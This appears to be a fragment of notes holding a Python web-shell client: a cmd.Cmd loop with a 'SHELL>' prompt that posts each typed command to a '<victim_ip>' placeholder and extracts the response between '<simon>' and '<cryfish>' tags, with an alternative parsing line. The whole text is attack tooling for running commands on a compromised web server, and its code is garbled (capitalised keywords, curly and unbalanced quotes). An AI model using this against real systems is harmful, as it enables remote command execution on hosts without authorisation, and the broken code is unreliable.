Import requests
Import re
From cmd import Cmd

Class Terminal(Cmd):
  Prompt=’SHELL>’
 
Def default(self,args):
   Data={‘param’:args}
   Res=requests.post(‘<victim_ip>’,data=data)
   
   Res2=re.findall(‘<simon>(.*?)<cryfish>’,res.text,re.DOTALL)[0]
   Print(res2)

                                                   Or
Res2=re.search(‘<simon>(.*?)<cryfish>,res.text,re.DOTALL)
print(res2.group(1))
